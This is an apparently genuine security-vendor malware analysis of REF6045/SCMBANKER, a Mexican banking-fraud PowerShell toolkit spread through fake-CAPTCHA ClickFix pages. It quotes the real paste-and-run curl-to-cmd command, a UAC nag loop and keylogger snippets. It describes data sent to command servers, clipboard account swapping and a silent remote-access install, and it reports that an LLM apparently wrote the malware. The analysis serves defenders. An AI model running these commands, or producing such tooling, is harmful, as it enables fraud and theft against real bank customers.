Analysis","url":"/security-labs/threat-command/category/malware-analysis","locale":"en-us","created_by":"blt03b12f5a6591ef8c","updated_by":"blt03b12f5a6591ef8c","created_at":"2026-08-12T12:28:35.178Z","updated_at":"2026-08-14T14:34:54.590Z","ACL":{},"_version":2,"tags":[],"seo":{"canonical_tag":"","do_not_index":false,"nofollow":false,"seo_description_l10n":"","seo_image":null,"seo_title_l10n":""},"title_l10n":"Malware Analysis","publish_details":{"time":"2026-08-25T08:19:17.315Z","user":"blt03b12f5a6591ef8c","environment":"blt835e2c3b7e9eb7fb","locale":"en-us"}}],"created_at":"2026-08-12T15:02:04.638Z","created_by":"blt03b12f5a6591ef8c","date":"2026-07-08T00:00:00.000Z","main_content":{"markdown_l10n":"A Mexican banking fraud operation we're tracking as REF6045 doesn't run on autopilot. A human operator is behind the wheel, monitoring infected machines and deciding what happens next. Victims are infected through fake CAPTCHA pages that trick them into running a single command, which installs SCMBANKER, a PowerShell toolkit with components dating back to at least October 2025. Once installed, the operator can see when a victim opens a banking session, lock the screen behind a fake bank warning, push the victims toward live phone interaction, redirect the browser, or replace account numbers copied to the clipboard. For a full takeover, they can also deploy a commercial remote-access tool.\n\n## Key takeaways\n\n* REF6045 adapts ClickFix delivery into operator-assisted banking fraud, using fake verification pages to stage a PowerShell toolkit (we’re calling SCMBANKER) on victim machines.\n* SCMBANKER gives operators a full fraud workflow: banking-session monitoring, screenshot capture, vishing overlays, phishing redirects, clipboard manipulation, and Remote Utilities installation.\n* SCMBANKER heavily targets Mexico’s financial ecosystem, including retail banks, business banking portals, fintechs, payment processors, cryptocurrency exchanges, investment platforms, SAT, and telecom services.\n* Operator OPSEC failures, including open directories, a leaked web-root archive, and an unauthenticated file editor, expose the operation’s tooling and targeting logic.\n* The scripts are riddled with AI-generated artifacts, indicating that the operator used an LLM to write most of the tooling.\n\n## How Elastic Security Labs discovered REF6045\n\nOn June 18, 2026, Elastic telemetry surfaced a host using [bitsadmin](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin) to download a batch of suspicious PowerShell scripts from an open directory at `http://68.211.161[.]46/files/`. The open directory allowed us to retrieve the individual agent scripts directly, and from the same server, we recovered an archive, `zkt.zip`, containing the operation's full web root before it was removed.\n\n![Elastic Defend alerts detecting SCMBANKER's suspicious bitsadmin download activity](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blta49346f1b05c1b95/6a7c8aa6bd219886887523a3/image16.png \"Elastic Defend alerts detecting SCMBANKER's suspicious bitsadmin download activity\")\n\nAt the web root of `http://68.211.161[.]46/`, we found a ClickFix fake-CAPTCHA flow that presented itself as a security verification page. The page first asked the visitor to complete an image challenge, including a Spanish prompt to select fire hydrants, before moving into the familiar Windows Run verification instructions. The command fetches `validation.txt` from the same web server and pipes it directly into `cmd.exe`, using the lure text “Google Verificación Segura (Version 2025.5755)”. The page also sends a POST request to a tracking endpoint at `https://ww.ssinvestigaciones[.]com/login3.php`.\n\n![Spanish-language fake CAPTCHA challenge used in the REF6045 ClickFix banking fraud lure](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltd37bacce79fdea0a/6a7c8aa942a117200a956231/image17.png \"Spanish-language fake CAPTCHA challenge used in the REF6045 ClickFix banking fraud lure\")\n\nBecause [`navigator.clipboard.writeText()`](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard/writeText) requires a secure, focused browser context to copy the malicious command to the victim's clipboard, the original IP (`http://68.211.161[.]46/`) was unlikely to be the only victim-facing delivery path. We identified multiple HTTPS ClickFix hosts that reused the same command pattern and pointed victims back to the exposed file servers for `validation.txt`.\n\nThe observed ClickFix and file-server variants are included in the following table. The C2 values were extracted from the PowerShell scripts hosted under each `/files` open directory.\n\n| ClickFix host | ClickFix validation.txt file source | File host (hosting toolkit) | C2 extracted from hosted PS1 scripts |\n| :---- | :---- | :---- | :---- |\n| `https://ratonvaquero2026[.]online/` | `http://68.211.161[.]46/validation.txt` | `https://ratonvaquero2026[.]online/files/` | `https://negratomasa2026[.]online/dashboard2/recData.php` |\n| `https://monteviral2026.duckdns[.]org/` | `http://68.211.161[.]46/validation.txt` | `https://monteviral2026.duckdns[.]org/files/` | `https://gestionmontelavaria2026[.]online/dashboard2/recData.php` |\n| `https://osogransd[.]online/` | `http://216.250.112[.]100/validation.txt` | `https://osogransd[.]online/files/` | `http://185.242.246[.]169/dashboard2/recData.php` |\n\n## SCMBANKER's execution chain\n\n![Diagram of the REF6045 SCMBANKER execution chain from ClickFix lure to C2 control](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt3d586c624e5414c5/6a7c8aac42a117722a956237/image20.png \"Diagram of the REF6045 SCMBANKER execution chain from ClickFix lure to C2 control\")\n\nThe initial infection chain described below uses the `monteviral2026.duckdns[.]org` ClickFix page as an example, but the observed variants follow the same pattern: they present a CAPTCHA-style verification page, including an image challenge, before copying a command to the clipboard and instructing the victim to run it from the Windows Run dialog.\n\nBelow is an example command line:\n\n```shell\ncmd /c curl -k http://68.211.161[.]46/validation.txt | cmd.exe \u0026 exit #                                                     CIoudfIare            Google Verificación Segura (Version 2025.5755)\n```\n\nDecoy strings `CIoudfIare` with capital-I homoglyphs, and the `Google Verificación Segura` version text are reproduced verbatim.\n\n![ClickFix fake verification page telling victims to paste a command into Windows Run](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt7f36de1c1af6c206/6a7c8aafbdcff01534c3d1fe/image18.png \"ClickFix fake verification page telling victims to paste a command into Windows Run\")\n\nDespite the `.txt` extension, it is a Windows batch script that prepares the host and sets up the full toolkit in six different stages.\n\n### Fake update smokescreen\n\nThe batch script immediately launches Microsoft Edge in [kiosk mode](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-configure-kiosk-mode#overview) pointing to `fakeupdate[.]net`, a well-known pentesting/red team site that renders a fake Windows Update screen. This distraction buys time for the script to fully execute.\n\n```shell\nstart msedge.exe --kiosk https://fakeupdate[.]net/win10ue --edge-kiosk-type=fullscreen\n```\n\n![Fake Windows Update screen SCMBANKER displays to distract Mexican banking fraud victims](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltfa9f71daedfd46d2/6a7c8ab296b5a647688756a0/image3.png \"Fake Windows Update screen SCMBANKER displays to distract Mexican banking fraud victims\")\n\n### UAC consent fatigue loop\n\nNext, the malware checks if it is running as admin via `net session`. If it is not elevated, it shows a social-engineered message \"Windows: Se requieren permisos de administrador para actualizar su sistema...\" (Administrator permissions are required to update your system…), and relaunches itself with `-Verb RunAs` every 20 seconds, frustrating and forcing the victim to click “Yes” on the UAC consent prompt.\n\n```shell\n:check\nnet session \u003enul 2\u003e\u00261\nif %errorlevel%==0 goto admin\necho Windows: Se requieren permisos de administrador para actualizar su sistema...\npowershell -Command \"Start-Process '%~f0' -Verb RunAs\"\ntimeout /t 20 \u003enul\ngoto check\n```\n\n### Cursor trap\n\nOnce elevated, an inline PowerShell P/Invoke call to `user32.dll!ClipCursor` confines the mouse to a single 1x1 pixel rectangle at the screen center, locking any mouse movement. This is paired with the fake Windows Update screen to encourage the victim to stay idle, giving time for the malware to download the full toolset in the background without interruption.\n\n![PowerShell ClipCursor code SCMBANKER uses to lock a victim's mouse during infection](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt8ae69ebb4a9b169e/6a7c8ab5da3d05477c633e9f/image10.png \"PowerShell ClipCursor code SCMBANKER uses to lock a victim's mouse during infection\")\n\n### Downloading the SCMBANKER toolkit via bitsadmin\n\nAll malicious scripts, files, and binaries are pulled individually via `bitsadmin` from `http://68.211.161[.]46/files/` to `C:\\Users\\Public\\`.\n\n![bitsadmin transfer jobs to download the SCMBANKER toolkit modules](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt44fed89d1426419c/6a7c8ab851156ad3432bca45/image8.png \"bitsadmin transfer jobs to download the SCMBANKER toolkit modules\")\n\n### SCMBANKER's persistence: registry Run key and startup folder\n\nTwo persistence mechanisms launched by `C:\\Users\\Public\\run.vbs` on logon, plus a one-shot infection marker:\n\n* **Run key**: `HKCU\\...\\Run`, value `\"run\"`, runs hidden PowerShell launching `run.vbs`.\n* **Startup folder**: `run.vbs` dropped to three path variants (`%APPDATA%`, `%USERPROFILE%\\AppData\\Roaming`, and the legacy XP `%USERPROFILE%\\Start Menu`).\n* **RunOnce timestamp**: value `\"id\"` writes `%date% %time%` to `C:\\Users\\Public\\id.txt` once on next logon, then self-deletes.\n\n### Forcing a reboot to trigger persistence\n\nThe script sends an `F11` keypress to exit fullscreen, followed by a `Ctrl+W` keypress sequence to close the fake Windows Update tab. However, this approach only works in a standard fullscreen browser window, not in kiosk mode. It then forces a reboot with the `shutdown /r /t 02` command. Upon restart, the previous persistence mechanism via the Registry Run key triggers execution of the VBScript file (`run.vbs`).\n\n![Batch script commands SCMBANKER uses to close its decoy tab and force a reboot](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt3214cc84b718b8be/6a7c8abb51156a514f2bca49/image19.png \"Batch script commands SCMBANKER uses to close its decoy tab and force a reboot\")\n\n## The SCMBANKER toolkit\n\n### run.vbs: SCMBANKER's master launcher\n\nThe VBScript (`run.vbs`) is the master launcher. It uses `WScript.Shell.Run` with a hidden window style and `Invoke-Expression` to start the toolkit's modules in parallel:\n\n![SCMBANKER's run.vbs master launcher starting each banking fraud toolkit module](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltaede87d3708fbb61/6a7c8abe1967ea872432a9a5/image9.png \"SCMBANKER's run.vbs master launcher starting each banking fraud toolkit module\")\n\n`run.vbs` launches the following modules:\n\n| Script | Role |\n| ----- | ----- |\n| `rotor2.ps1` | Long-running process-mutation rotator for `mensaje1.ps1` (vishing module) |\n| `ini.ps1` | Delayed launcher for `jujuzkt.ps1` (banking activity monitor) |\n| `remo.ps1` | IP-gated launcher for `jujuzkt2.ps1` (phishing redirect module) |\n| `edifhjwe.ps1` | Toolkit updater |\n| `cliente.ps1` | C2 beacon / implant control channel |\n| `avs.ps1` | Remote Utilities RAT installer downloader |\n| `clip.ps1` / `clip2.ps1` | [CLABE](https://en.wikipedia.org/wiki/CLABE) and card-number clipboard hijackers |\n| `correr.ps1` | Arbitrary PowerShell executor |\n| `cursor2.exe` | Invisible-cursor utility (compiled AutoIt). Replaces every system cursor type with an invisible cursor at `C:\\Users\\Public\\invi.cur` |\n\nPivoting in VirusTotal, we discovered earlier versions of the toolkit components, suggesting the tooling has been in use since at least October 2025 and has been iterated on for several months.\n\n![VirusTotal scan showing 8 of 63 vendors flagging an early version of SCMBANKER's run.vbs launcher script](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt8edf690d79e606c0/6a7c8ac1227b1c98a45927e0/image1.png \"VirusTotal scan showing 8 of 63 vendors flagging an early version of SCMBANKER's run.vbs launcher script\")\n\n### C2 beacon and victim management\n\nEvery 30 seconds, `cliente.ps1` collects a machine profile and performs an HTTP POST request to `https://negratomasa2026[.]online/dashboard2/recData.php`:\n\nThe following table represents this request data and its associated fields:\n\n| Field | Source | Purpose |\n| ----- | ----- | ----- |\n| `machine_name` | `$env:COMPUTERNAME` | Victim identification |\n| `client_id` | `GUID` in `client_id.txt` | Unique implant ID (persists across reboots) |\n| `ip_local` | `Get-NetIPAddress` | Internal network recon |\n| `ip_public` | `api.ipify.org` | External IP for geolocation and targeting |\n| `comentario` | `comentario.txt` | Operator's notes/label for this victim |\n| `idInternet` | `id.txt` | Infection timestamp |\n| `remoto` | `agent.txt` | RAT installation status (default: `SIN REMOTO AUN`) |\n| `comando` | `comando.txt` | Last command received |\n| `optUpdate` | hardcoded “update” | Meant to flag whether the remote tool is installed, but it's overridden to always say `\"update\"` (likely debugging leftover) |\n| `timestamp` | Unix epoch | Beacon time |\n\nThe C2 response contains two operator-controlled fields.\n\nThe data from the `comentario` field is saved to `comentario.txt` and stores the operator’s label or notes for the victim.\n\nThe data from the `comando` field is saved to `comando.txt`. Other modules poll that file for operator instructions:\n\n* `avs.ps1` handles MSI URLs.\n* `edifhjwe.ps1` handles ZIP update packages.\n* `correr.ps1` handles PowerShell-prefixed execution requests.\n\nThe following image shows the server response parsing logic.\n\n![PowerShell code showing SCMBANKER's self-update module downloading a new toolkit ZIP](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blta6c3e53c67ecbd5d/6a7c8ac4e88c6575db00596d/image13.png \"PowerShell code showing SCMBANKER's self-update module downloading a new toolkit ZIP\")\n\n### Banking activity monitor\n\nThe primary banking activity monitor is a PowerShell script (`jujuzkt.ps1`), but it also has optional active branches:\n\n* URL injection when a configured target has a redirect URL, and\n* a commented-out keylogger rotator path via `rotor.ps1`.\n\nAfter a short startup delay, invoked by `ini.ps1`, the banking monitor script refreshes three configuration files every five minutes.\n\n| Remote URL | Local File | Content |\n| ----- | ----- | ----- |\n| `https://negratomasa2026[.]online/a/teleavisos.txt` | `config1.txt` | Arbitrary PowerShell executed via `Invoke-Expression` |\n| `https://negratomasa2026[.]online/b/listadebancos.txt` | `config2.txt` | Window title keywords (bank names + optional redirection target, `*`-delimited) |\n| `https://negratomasa2026[.]online/b/keysnegativas.txt` | `config_negative.txt` | Negative keywords to filter out false matches when scanning opened windows |\n\nOnce running, the banking activity monitor checks all visible window titles every second. A match (full list [here](https://gist.github.com/jiayuchann/cfbeb1b194b2e186fc599eb51d4719cc)) against any listed bank, fintech, payment processor, crypto exchange, brokerage, SAT, or telecom keywords causes the implant to POST an alert to `https://negratomasa2026[.]online/dashboard2/avisos2.php` in the following format:\n\n```\nmensaje = \"\u003cwindow title\u003e\nDetected C0incidence: '\u003ckeyword\u003e'\nVersion: V.1.0.1\n10:03 p. m. 08/12/2025\nNombre de PC: \u003chostname\u003e\nCliente desde: \u003cid\u003e\nClient ID: \u003cclientId\u003e\nIP: \u003cpublic_ip\u003e\nNavegador: \u003cprocess_name\u003e\n\u003ccurrent timestamp\u003e\"\nclientId = \u003cclientId\u003e\n```\n\nA banking match also starts the screenshot workflow through the toolkit’s rotator pattern. The `rotor` scripts act as short-lived wrappers: they copy a target script into `%TEMP%` under Windows-like process names, execute the copy, and repeat for a set period. In this case, `rotor1.ps1` repeatedly spawns `screen2.ps1` every 7 seconds for 5 minutes, producing about 42 screenshots per trigger. Each `screen2.ps1` run captures the full virtual desktop, compresses the image under 10 MB, and uploads it to `https://negratomasa2026[.]online/dashboard2/imagenes.php`.\n\n![PowerShell code from SCMBANKER's rotor and screen modules compressing and uploading screenshots](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt017868485c07c534/6a7c8ac733fa8a78861fca96/image23.png \"PowerShell code from SCMBANKER's rotor and screen modules compressing and uploading screenshots\")\n\n### SCMBANKER's keylogging module\n\n`jujuzkt.ps1` also contains a commented-out path to launch `rotor.ps1`, a short-lived rotator for `key.ps1`. While the banking monitor path launches `rotor1.ps1` for screenshots, the presence of `rotor.ps1` and `key.ps1` shows an additional keylogging capability in the toolkit. `rotor.ps1` applies the same rotator pattern to `C:\\Users\\Public\\key.ps1`.\n\nThis PowerShell script (`key.ps1`) fetches Telegram bot credentials from `https://negratomasa2026[.]online/a/telekeylogger.txt` via `Invoke-Expression`, but never references them after assignment. The only exfiltration path in the script is an HTTP POST to `https://negratomasa2026[.]online/dashboard2/logs.php` with the client ID and hostname. The Telegram configuration may be leftover code from an earlier version.\n\n### The vishing engine: turning infections into live phone scams\n\nThe vishing engine is what turns a commodity-looking PowerShell bundle into an operator-assisted fraud workflow. `rotor2.ps1` applies the rotator pattern to `mensaje1.ps1`, keeping the dispatcher alive under changing Windows-like filenames.\n\nWhen `mensaje1.ps1` is launched, every 10 seconds it fetches `https://negratomasa2026[.]online/b/\u003credacted\u003e.txt`, where each line has the format `\u003cIP\u003e*\u003cURL\u003e`, mapping a victim public IP address to a vishing page URL. If the victim’s public IP appears in that list, the dispatcher launches a vishing lock-screen module and records the child process ID so it can later release the victim when the IP is removed.\n\n![SCMBANKER configuration mapping victim IP addresses to vishing lock-screen pages](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltff14c1c4902e0677/6a7c8aca6c6eac3189f0e4da/image12.png \"SCMBANKER configuration mapping victim IP addresses to vishing lock-screen pages\")\n\nThe operator can choose between two overlay behaviors.\n\n* `mensaje.ps1` creates a borderless, topmost [WebBrowser](https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.webbrowser?view=windowsdesktop-10.0) window, confines the mouse to the form, and uses a `200` ms timer to bring the overlay back to the foreground if the victim clicks away.\n* `mensajeoff.ps1` uses a more normal-looking window that cannot be closed and automatically undoes every attempt to dismiss, move, resize, or minimize it. Triggered when the URL ends with `?off`.\n\nThe content of those pages completes the social engineering loop: the victim sees a fake bank warning and is prompted to call an operator. One observed page, `http://68.211.161[.]46/driver.html?off`, links to a Remote Utilities payload, connecting the vishing prompt directly to hands-on access.\n\n![Fake bank security warning pages SCMBANKER shows victims during vishing session](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt5c15a41e66f10ac4/6a7c8acd6c6eac4b91f0e4de/image14.png \"Fake bank security warning pages SCMBANKER shows victims during vishing session\")\n\n### Active browser redirects to phishing pages\n\nUnlike the banking monitor, the redirect module only engages victims the operator has explicitly queued for phishing. `remo.ps1` polls `https://negratomasa2026[.]online/b/\u003credacted\u003e.txt` every 5 minutes, and only victims whose public IP appears in that file launch the second monitor, `jujuzkt2.ps1`.\n\n`jujuzkt2.ps1` watches window titles against `https://negratomasa2026[.]online/b/urlsscams.txt` (archived list [here](https://gist.github.com/jiayuchann/5851f64467bac4c456dab67e2fb55622)) and, when a configured URL exists, places the phishing URL on the clipboard, focuses the browser, sends keypresses (`Ctrl+L`, `Ctrl+V`, and `Enter`), then pauses before continuing.\n\nMany `urlsscams.txt` entries currently end with an empty URL, which suggests target coverage was planned ahead of the completed vishing pages.\n\nAn observed redirect destination, `https://bancaporinternetbbmx[.]online`, also includes a page-load Telegram notification script. When the phishing page opens, the script forces IPv4 resolution, collects browser and device details, and sends the profile to a Telegram chat. This gives the operator immediate confirmation that a redirected victim has reached the lure and has enough context to prioritize live follow-up.\n\n![JavaScript code sending victim device and location data to Telegram on a SCMBANKER phishing page](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6924bbcaa4db5e07/6a7c8ad02f00b2f761ef8fa1/image21.png \"JavaScript code sending victim device and location data to Telegram on a SCMBANKER phishing page\")\n\n### Clipboard and transfer manipulation\n\nThe clipboard modules focus on payment redirection rather than credential theft.\n\n* `clip.ps1` checks the clipboard every 300 milliseconds for 18-digit CLABE account numbers, then matches the first three digits against the Mexican bank prefix and can replace the destination account with an attacker-controlled CLABE from `https://negratomasa2026[.]online/b/clabes.txt`.\n* `clip2.ps1` applies the same process to 16-digit card numbers, matches on the six-digit bank identification numbers, and replaces them with values from `https://negratomasa2026[.]online/b/tarjetas.txt`.\n\n![SCMBANKER's clip.ps1 and clip2.ps1 scripts hijacking CLABE and card numbers](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt2b30345fb7c6a6ba/6a7c8ad2c33f4fc747d54b94/image15.png \"SCMBANKER's clip.ps1 and clip2.ps1 scripts hijacking CLABE and card numbers\")\n\n### How does the operator get hands-on access to a victim's machine?\n\nSCMBANKER gives the operator direct, hands-on-keyboard control by installing a remote-access tool. Rather than build one, REF6045 repurposes [Remote Utilities Host](https://www.remoteutilities.com/), a legitimate commercial remote-administration product, and configures it silently to call back.\n\nDeployment is operator-triggered and runs through three scripts. The first script (`avs.ps1`) polls `comando.txt` every 120 seconds, and when the operator pushes an `.msi` URL it downloads the installer to `C:\\Users\\Public\\` and launches `instaler.ps1`. This second script (`instaler.ps1`) exits if the `99.kut` guard file already exists so the RAT installs only once, relaunches itself with `-Verb RunAs` until it gets admin, then installs silently with `msiexec /i \"hosts.msi\" /quiet /norestart`. On success, it writes `REMOTO INSTALADO` to `agent.txt`, drops the `99.kut` guard, and runs `attrib +h +s \"C:\\Users\\Public\"` to hide the implant directory.\n\n![Extracted file list from SCMBANKER's Remote Utilities Host remote access installer](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt26bbabcc33ca0386/6a7c8ad542a1178492956245/image6.png \"Extracted file list from SCMBANKER's Remote Utilities Host remote access installer\")\n\nThe third script (`remoto.ps1`) waits 120 seconds, then imports a registry blob into `HKLM\\SOFTWARE\\Usoris\\Remote Utilities Host\\Host\\Parameters` that sets callback auto-connect to the operator (default port 5650, Spanish UI, notifications suppressed, a hardcoded auth key, and SID `46053.045416157`).\n\n![Decoded registry configuration SCMBANKER uses to auto-connect its remote access tool](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blta94fefc991ae5c37/6a7c8ad87cfd7af399314e4a/image7.png \"Decoded registry configuration SCMBANKER uses to auto-connect its remote access tool\")\n\nIt also deletes the `UninstallString` at `HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{F6688BD5-2126-4F4F-A484-1D05781479B9}` so the victim cannot remove it through the traditional Windows menu: Add/Remove Programs.\n\nThe result is a persistent, attacker-configured remote desktop that calls home on its own, runs without tray notifications, and resists removal. It is the same payload as the `driver.html?off` vishing page points victims to, so the social-engineering prompt and the silent install converge on the same hands-on access.\n\n### SCMBANKER's self-update mechanism\n\nSCMBANKER includes a self-update mechanism that lets the operator replace the implant from the C2 without rebuilding persistence. `edifhjwe.ps1` polls `C:\\Users\\Public\\comando.txt` (C2 command written by `cliente.ps1`) every 40 seconds and treats a ZIP URL as an update instruction.\n\nWhen triggered, `edifhjwe.ps1` downloads the ZIP to `%TEMP%\\Agent_temp.zip`, wipes most of `C:\\Users\\Public\\`, and extracts the new toolkit into place. It preserves a small set of state files, including `comando.txt`, `comentario.txt`, `id.txt`, `agent.txt`, and `99.kut`, so the updated bot keeps its operator notes, infection timestamp, remote-access status, and Remote Utilities install marker.\n\nAfter extraction, the updater writes `BOT ACTUALIZADO` to `comando.txt` as a completion flag, kills running PowerShell module processes by script name, and relaunches `run.vbs`.\n\n![PowerShell code showing SCMBANKER's self-update module downloading a new toolkit ZIP](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltdf0b2625a5f95ccc/6a7c8adb9f52510871664150/image4.png \"PowerShell code showing SCMBANKER's self-update module downloading a new toolkit ZIP\")\n\n## Is the REF6045 malware written by AI?\n\nThe scripts show strong signs of AI assistance, most likely by prompting a large language model in Spanish and then applying manual obfuscation afterward. The code has a split personality, with clean, descriptive function names and heavy explanatory comments sitting next to hand-shortened variables and leftover generation artifacts. The placement of instruction-like comments directly above the code they describe suggests the authors have prompted an inline coding assistant such as Copilot or Cursor.\n\nThe clearest artifact is a comment sitting directly in the mutation rotator and the keylogger (`rotor2.ps1` and `key.ps1`), which are saturated with aggressive profanity in their comments, while the rest of the kit uses a neutral tone:\n\n![AI-generated comments in SCMBANKER's rotor2.ps1 script revealing LLM-written malware](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt8ff15f89e4cdf4d9/6a7c8adec33f4f413fd54b9e/image11.png \"AI-generated comments in SCMBANKER's rotor2.ps1 script revealing LLM-written malware\")\n\n`key.ps1` uses self-documenting obfuscation. It Base64-encodes its Win32 API names to hide them from scanners, then immediately annotates what each one decodes to:\n\n```\n$u32b64  = 'dXNlcjMyLmRsbA=='          # user32.dll\n$GASb64  = 'R2V0QXN5bmNLZXlTdGF0ZQ=='  # GetAsyncKeyState\n$GKLb64  = 'R2V0S2V5Ym9hcmRMYXlvdXQ='  # GetKeyboardLayout\n$TUExb64 = 'VG9Vbmljb2RlRXg='          # ToUnicodeEx\n```\n\nEvery script opens with heavy banner-comment dividers (`INTERVALOS DE TIEMPO`, `DICCIONARIOS Y VARIABLES`, `FUNCIONES`, `INICIO`, `LOOP PRINCIPAL`). This document-like scaffolding is a hallmark of LLM-generated PowerShell and is rarely seen in scripts by experienced developers.\n\nTaken together, the evidence points to an operator who prompted a model in Spanish, used profanity and phrasing tricks either out of frustration or to bypass safety filters for the more sensitive components, and pasted the outputs with little review before applying a light manual obfuscation pass. The kit was not generated autonomously, but the model did the heavy lifting on essentially every functional script.\n\nAs language models become increasingly capable, defenders should expect AI-assisted malware development to become more common, particularly among operators who previously lacked the expertise to implement these capabilities themselves.\n\n## REF6045's infrastructure and OPSEC failures\n\nThe depth of this analysis was made possible by poor server hygiene across the operation. The file server at `http://68.211.161[.]46/files/` had directory listing enabled, exposing the PowerShell agent scripts for direct download. The same directory also briefly hosted `zkt.zip`, which yielded the entire operation in a single archive.\n\n![Open directory listing exposing SCMBANKER's PowerShell toolkit files for download](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt7c84303448b24d22/6a7c8ae105b7b5ab24185bc3/image22.png \"Open directory listing exposing SCMBANKER's PowerShell toolkit files for download\")\n\nThe C2 also exposed an unauthenticated file editor at `/b/editor.php`, allowing anyone to directly modify the operation's live targeting configuration files without credentials. The same surface that lets the operator manage victims also lets a visitor read and write the configuration files.\n\n![Unauthenticated REF6045 file editor exposing live banking fraud targeting configuration](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltdfa679c8df23b1ba/6a7c8ae35967e530b05d767d/image5.png \"Unauthenticated REF6045 file editor exposing live banking fraud targeting configuration\")\n\nThe related ClickFix hosts listed earlier reused the same `validation.txt` delivery pattern while hosting overlapping PowerShell toolsets under `/files`. Those hosted scripts pointed to separate C2 panels, but the panels shared the same SCM-branded login template, with the latest we’ve seen being SCM v2.0, hence the name SCMBANKER.\n\n![Three REF6045 command-and-control panels sharing the same SCM banking fraud login template](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltff029a53f8aaee44/6a7c8ae705b7b53dc5185bc7/image2.png \"Three REF6045 command-and-control panels sharing the same SCM banking fraud login template\")\n\nTaken together, the open directories, exposed editor, repeated lure text, overlapping file-server contents, and shared SCM panel branding suggest kit reuse or multiple deployments by the same operator set. We treat the related hosts as infrastructure variants around the same tooling rather than as separate malware families.\n\n## Why REF6045 matters despite its crude execution\n\nREF6045 is not a complex operation. The tooling is crude and held together with copy-paste batch files, duplicated bitsadmin jobs, sloppy persistence, self-defeating obfuscation that ships its own key, and a server left wide open with directory listings, a full web-root archive, and an unauthenticated editing panel.\n\nThat lack of craftsmanship is partly explained by how the kit was developed. The scripts are littered with numerous AI-generated artifacts, suggesting the operator relied heavily on a large language model to implement much of the functionality. Rather than writing components such as the keylogger or a clipboard hijacker from scratch, the operator prompted a model, pasted the output, and applied a light manual obfuscation pass on top.\n\nVictims are kept as a passive feed while the operator watches a live dashboard and engages only the targets worth the effort, switching on browser redirects, vishing lockdowns, clipboard swaps, or a full RAT by IP, on demand. Crude as it is, SCMBANKER already has real victims. The live victim counter and the labeled, tagged machines on the operator's own panels show that individual people are being actively targeted.\n\n## REF6045 through MITRE ATT\u0026CK\n\nElastic uses the [MITRE ATT\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that threats use against enterprise networks.\n\n### Tactics\n\nTactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.\n\n* [Initial Access](https://attack.mitre.org/tactics/TA0001/)\n* [Execution](https://attack.mitre.org/tactics/TA0002/)\n* [Persistence](https://attack.mitre.org/tactics/TA0003/)\n* [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)\n* [Stealth](https://attack.mitre.org/tactics/TA0005/)\n* [Credential Access](https://attack.mitre.org/tactics/TA0006/)\n* [Discovery](https://attack.mitre.org/tactics/TA0007/)\n* [Collection](https://attack.mitre.org/tactics/TA0009/)\n* [Exfiltration](https://attack.mitre.org/tactics/TA0010/)\n* [Command and Control](https://attack.mitre.org/tactics/TA0011/)\n* [Impact](https://attack.mitre.org/tactics/TA0040/)\n\n### Shutdown/Reboot](https://attack.mitre.org/techniques/T1529/)\n* [Financial Theft](https://attack.mitre.org/techniques/T1657/)\n\n## How to detect and prevent REF6045\n\n### Prevention rules for detecting SCMBANKER\n\n* [Suspicious PowerShell Execution via Windows Scripts](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/execution_suspicious_powershell_execution_via_windows_scripts.toml)\n* [DNS Query to Suspicious Top Level Domain](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/command_and_control_dns_query_to_suspicious_top_level_domain.toml)\n* [Suspicious Bitsadmin Activity](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_suspicious_bitsadmin_activity.toml)\n* [Suspicious Windows Script Interpreter Child Process](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/execution_suspicious_windows_script_interpreter_child_process.toml)\n* [Execution from Unusual Directory](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/execution_execution_from_unusual_directory.toml)\n* [External IP Address Discovery via a Trusted Program](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/discovery_external_ip_address_discovery_via_a_trusted_program.toml)\n* [Suspicious String Value Written to Registry Run Key](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/persistence_suspicious_string_value_written_to_registry_run_key.toml)\n* [Suspicious Command Execution via Windows Run](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/execution_suspicious_command_execution_via_windows_run.toml)\n* [Curl HTTP Fetch Piped to Cmd or Node via Command Shell](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/execution_curl_http_fetch_piped_to_cmd_or_node_via_command_shell.toml)\n\n## 